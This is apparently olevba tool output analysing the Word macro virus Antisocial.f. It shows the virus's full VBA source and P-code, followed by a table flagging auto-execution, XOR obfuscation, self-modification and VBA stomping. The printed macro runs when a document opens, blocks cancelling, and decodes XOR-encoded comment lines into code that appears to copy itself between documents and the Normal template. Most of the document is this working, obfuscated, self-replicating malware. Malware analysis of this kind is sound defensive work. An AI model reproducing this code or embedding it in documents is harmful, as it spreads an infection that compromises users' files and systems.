olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 18: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'6Ivroihu(UgpcHitkgjVtikvr&;&6
'5Juqljkv+FjkclwhFjks`wvljkv%8%5?%Juqljkv+SlwpvUwjq`fqljk%8%5
'5V`q%FH%8%QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`
'3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'3Pfw#MW#>#MlqnboWfnsobwf-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'7Ahu'c':'1'Sh'6?='D#':'%%='N':'/DJ)Knibt/c+'6..
'1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B%
'7SontChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)UbwkfdbKnib'c+'% %'!'a'!'F='Ibs'c
'7JD':'DJ)Knibt/6+'DJ)DhrisHaKnibt.
'6GB(BcjcrcJohcu&7*&GB(EishrI`Johcu<&GB(Gbb@tikUrtoha&KE
'1OU/EdmdudMhodr!0-!OU/BntouNgMhodr;!OU/@eeGsnlRushof!LB
'4Egpmra@kgqiajp*WeraEw$BmhaJeia>9Egpmra@kgqiajp*BqhhJeia
'7 Fuebnsbu'E~'K~t'Lhqndl)))'Trhu'Jn'Dhdlrt
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Antisocial.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8231 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #1:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x0006 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C$ 
' 	BoS 0x0000 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #2:
' 	Ld I 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St False 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld False 
' 	Xor 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #3:
' 	Ld d 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	ArgsCall (Call) ViewVBCode 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #5:
' 	QuoteRem 0x0000 0x001D "6Ivroihu(UgpcHitkgjVtikvr&;&6"
' Line #6:
' 	QuoteRem 0x0000 0x003C "5Juqljkv+FjkclwhFjks`wvljkv%8%5?%Juqljkv+SlwpvUwjq`fqljk%8%5"
' Line #7:
' 	QuoteRem 0x0000 0x0040 "5V`q%FH%8%QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`"
' Line #8:
' 	QuoteRem 0x0000 0x0042 "3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof"
' Line #9:
' 	QuoteRem 0x0000 0x0042 "3Pfw#MW#>#MlqnboWfnsobwf-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof"
' Line #10:
' 	QuoteRem 0x0000 0x002F "7Ahu'c':'1'Sh'6?='D#':'%%='N':'/DJ)Knibt/c+'6.."
' Line #11:
' 	QuoteRem 0x0000 0x006B "1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B%"
' Line #12:
' 	QuoteRem 0x0000 0x005A "7SontChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)UbwkfdbKnib'c+'% %'!'a'!'F='Ibs'c"
' Line #13:
' 	QuoteRem 0x0000 0x0022 "7JD':'DJ)Knibt/6+'DJ)DhrisHaKnibt."
' Line #14:
' 	QuoteRem 0x0000 0x0037 "6GB(BcjcrcJohcu&7*&GB(EishrI`Johcu<&GB(Gbb@tikUrtoha&KE"
' Line #15:
' 	QuoteRem 0x0000 0x0037 "1OU/EdmdudMhodr!0-!OU/BntouNgMhodr;!OU/@eeGsnlRushof!LB"
' Line #16:
' 	QuoteRem 0x0000 0x0038 "4Egpmra@kgqiajp*WeraEw$BmhaJeia>9Egpmra@kgqiajp*BqhhJeia"
' Line #17:
' 	QuoteRem 0x0000 0x002B "7 Fuebnsbu'E~'K~t'Lhqndl)))'Trhu'Jn'Dhdlrt"
' Line #18:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

